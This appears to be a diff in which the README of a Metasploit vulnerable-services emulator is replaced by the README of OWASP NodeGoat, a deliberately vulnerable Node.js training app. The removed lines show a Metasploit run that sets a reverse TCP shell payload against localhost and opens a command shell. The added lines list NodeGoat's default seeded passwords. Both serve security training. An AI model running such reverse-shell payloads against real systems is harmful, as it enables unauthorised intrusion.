@@ -1,123 +1,118 @@
-# Metasploit Vulnerable Services Emulator
+# NodeGoat
 
-   Many IT professionals and engineers want to learn security because it's such a hot field right now.  There are many free tools 
-out there, one of the most famous is Metasploit.  An obvious route to teach oneself about security is to download Metasploit and
-play with it. However, without vulnerable services to test again, it's hard to play with Metasploit. 
+Being lightweight, fast, and scalable, Node.js is becoming a widely adopted platform for developing web applications. This project provides an environment to learn how OWASP Top 10 security risks apply to web applications developed using Node.js and how to effectively address them.
 
-   The tool is created to emulate vulnerable services for the purpose of 
-* test Metasploit modules.  
-* help with training on Metasploit. 
+## Getting Started
+OWASP Top 10 for Node.js web applications:
 
-   It runs on Linux (Ubuntu), windows platform (hopefully Mac OSX). Currently it supports over 100 emulated vulnerable services,
-we will keep adding more to cover as many of the 1000+ modules in Metasploit as possible. 
+### Know it!
+[Tutorial Guide](http://nodegoat.herokuapp.com/tutorial) explaining how each of the OWASP Top 10 vulnerabilities can manifest in Node.js web apps and how to prevent it.
 
-# Key feature
+### Do it!
+[A Vulnerable Node.js App for Ninjas](http://nodegoat.herokuapp.com/) to exploit, toast, and fix. You may like to [set up your own copy](#how-to-setup-your-copy-of-nodegoat) of the app to fix and test vulnerabilities. Hint: Look for comments in the source code.
+##### Default user accounts
+The database comes pre-populated with these user accounts created as part of the seed data -
+* Admin Account - u:admin p:Admin_123
+* User Accounts (u:user1 p:User1_123), (u:user2 p:User2_123)
+* New users can also be added using the sign-up page.
 
-  To make it easy to add a new emulated service, we have designed it to be language independent: the service emulation is 
-in JSON format, one can add/remove/edit a service in JSON very quickly
+## How to Setup Your Copy of NodeGoat
 
-  A minor but interesting feature is that we make it easy to create SSL socket, all TCP sockets can automatically upgrade to SSL. 
+### OPTION 1 - One click install on Heroku
+The the quickest way to get running with NodeGoat is to click the button below to deploy it on Heroku.
 
-# Quick run
+Even though it is not essential, but recommended that you fork this repository and deploy the forked repo.
+This would allow you to fix vulnerabilities in your own forked version, and deploy and test it on heroku.
 
-Note that the commands typed on the shell session spawned are actually executed on the target, so please run this emulator in a safe environment if you don't want it to be owned :-)
+[![Deploy](https://www.herokucdn.com/deploy/button.png)](https://heroku.com/deploy)
 
-You may have to install the following packages depending on your environment: IO::Socket::SSL Try::Tiny IO::Compress::Gzip Compress::Zlib Storable.
-On my Ubuntu, they can be installed as
+This Heroku instance uses Free ($0/month) node server and MongoLab add-on.
+
+### OPTION 2 - Run NodeGoat on your machine
+
+If you do not wish to run NodeGoat on Heroku, please follow these steps to setup and run it locally -
+* Install [Node.js](http://nodejs.org/) - NodeGoat requires Node v4.4 or above
+
+* Clone the github repository
 ```
-sudo cpanm install IO::Socket::SSL Try::Tiny IO::Compress::Gzip Compress::Zlib Storable JSON
-```
-
-On vulnerability Emulator:
-```
-perl vulEmu.pl
->>activate exploits/windows/iis/ms01_023_printer
-
-```
-on Metasploit console:
-```
-msf > use exploit/windows/iis/ms01_023_printer
-msf > set payload windows/shell_reverse_tcp
-msf > setg RHOST 127.0.0.1
-msf > setg LHOST 127.0.0.1
-msf exploit(ms01_023_printer) > run
-
-[*] Started reverse TCP handler on 127.0.0.1:4444 
-[*] Command shell session 4 opened (127.0.0.1:4444 -> 127.0.0.1:51852) at 2017-01-20 10:47:12 -0600
-
->>ls
-README.md
-secret.txt
-server_cert.pem
-server_key.pem
-service.cfg
-vulEmu.pl
-
+git clone https://github.com/OWASP/NodeGoat.git
 ```
 
-# Run it with Docker
-
-If you want to run the above example in a container environment with docker, just run:
-
+*go to the directory
 ```
-docker run --rm -it -p 80:80 vulnerables/metasploit-vulnerability-emulator
+cd NodeGoat
 ```
 
-Then you will be presented to the very same shell, if you don't have docker installed, just follow the instructions [here](https://docker.com).
-
-Remember, you have to map the port that you want addding a `-p external-port:internal-port` argument. To map all ports present in service.cfg, please run this command:
-
+* Install node modules
 ```
-docker run --rm -it \
-       -p 20:20 -p 21:21 -p 80:80 -p 443:443 -p 4848:4848 \
-       -p 6000:6000 -p 6060:6060 -p 7000:7000 -p 7181:7181 \
-       -p 7547:7547 -p 8000:8000 -p 8008:8008 -p 8020:8020 \
-       -p 8080:8080 -p 8400:8400 \
-       vulnerables/metasploit-vulnerability-emulator
+npm install
 ```
 
-# Developer overview
+* Create Mongo DB:
+    You can create a remote MongoDB instance or use local mongod installation
+    * A. Using Remote MongoDB
+        * Create a sandbox mongoDB instance (free) at [mLab](https://mlab.com/plans/pricing/#plan-sandbox)
+        * Create a new database.
+        * Create a user.
+        * Update the `db` property in file `config/env/development.js` to reflect your DB setup. (in format: `mongodb://<username>:<password>@<databasename>`)
+    * OR B.Using local MongoDB
+        * If using local Mongo DB instance, start [mongod](http://docs.mongodb.org/manual/reference/program/mongod/#bin.mongod).
+        * Update the `db` property in file `config/env/development.js` to reflect your DB setup. (in format: `mongodb://localhost:27017/<databasename>`)
 
-
-The software has two parts
-
-* Server/service emulation description file in JSON  (service.cfg)
-* Interpreter (currently implemented in perl, but it can be done with other languages too)
-
-Here is a quick example from part of the service emulation description file, for the Metasploit module exploit/multi/http/tomcat_mgr_deploy.
-
-
+* Populate MongoDB with seed data required for the app
+    * Run the npm-script below to populate the DB with seed data required for the application. Pass the desired environment as argument. If not passed, "development" is the default:
 ```
-	"exploit/multi/http/tomcat_mgr_deploy" : {
-		"defaultPort": [80],
-		"seq": [
-			["substr", "GET \/manager\/serverinfo"],
-			["HTTP/1.0 200 OK\r\nContent-Length: $\r\n\r\n", "!!OS Name: Linux\nOS Architecture: x86_64"],
-			["starts", "PUT /manager/deploy?path="],
-			["HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n", {
-				"connect": "127.0.0.1:4444"
-			}]
-		]
-	},
+npm run db:seed
+```
+* Start server, this starts the NodeGoat application at url [http://localhost:4000/](http://localhost:4000/)
+```
+npm start
 ```
 
- The most important part is the "seq" array. it always has even number of entries.  When a message is received, it's compared
-to the entries 0, 2, 4 ... Once a match is found, it will execute the entry immediately after it.  For example, if an entry
-matches with entry 2, it will execute the statements in entry 3. 
+### OPTION 3 - Run NodeGoat on Docker
 
- The matching entries have the matching actions such as
+**You need to install [docker](https://docs.docker.com/installation/) and [docker compose](https://docs.docker.com/compose/install/) to be able to use this option**
 
-* **substr**:  do a substring match
-* **regex**:   do a regular expression match
-* **starts**:  check if incoming message starts with the string in the entry
+The repo includes the Dockerfile and docker-compose.yml necessary to setup the app and the db instance then connect them together.
 
-  The execution entry itself can have multiple entries. Each entry can be just a string, an array or dictionary. strings and arrays
-are used to build the response message (by concatentation).  For an array, it has a few elements, the first element is action type,
-such as
+* Change the db config in `config/env/development.js` to point to the respective Docker container.
+```
+db: "mongodb://mongo:27017/nodegoat",
+```
+* Build the images:
+```
+docker-compose build
+```
+* Run the app:
+```
+docker-compose up
+```
 
-* **repeat**:  return a string after repeating the string (second element) by the certain number of times specified by the third element.
-* **nsize**:   return the size of the element
-* **gzip**:    return the gzipped content
-   
-   It can also do compacting of string into binary data, such as  ["N", 123] which will compact the number 123 into big-endean 
-4-byte integer.
+
+#### Customizing the Default Application Configuration
+The default application settings (database url, http port, etc.) can be changed by updating the [config file] (https://github.com/OWASP/NodeGoat/blob/master/config/env/all.js).
+
+## Report bugs, Feedback, Comments
+*  Open a new [issue](https://github.com/OWASP/NodeGoat/issues) or contact team by joining chat at [Slack](https://owasp.slack.com/messages/project-nodegoat/) or [![Join the chat at https://gitter.im/OWASP/NodeGoat](https://badges.gitter.im/Join%20Chat.svg)](https://gitter.im/OWASP/NodeGoat?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)
+
+## Contributing
+Contributions from community are key to make NodeGoat a high quality comprehensive resource. Lets make NodeGoat awesome together!
+
+### Ways to Contribute
+Depending on your preference, you can contribute in various ways. Here are tasks planned for [upcoming release](https://github.com/OWASP/NodeGoat/milestones).
+You can also open an issue, sending a PR, or get in touch on [Gitter Chat](https://gitter.im/OWASP/NodeGoat) or [Slack](https://owasp.slack.com/messages/project-nodegoat/)
+
+If sending PR, once code is ready to commit, run:
+```
+npm run precommit
+```
+This command uses `js-beautifier` to indent the code and verifies these [coding standards](https://github.com/OWASP/NodeGoat/blob/master/.jshintrc) using `jsHint`. Please resolve all `jsHint` errors before committing the code.
+
+## Contributors
+Here are the amazing [contributors](https://github.com/OWASP/NodeGoat/graphs/contributors) to the NodeGoat project.
+
+## Supports
+- Thanks to JetBrains for providing licenses to fantastic [WebStorm IDE](https://www.jetbrains.com/webstorm/) to build this project.
+
+## License
+Code licensed under the [Apache License v2.0.](http://www.apache.org/licenses/LICENSE-2.0)
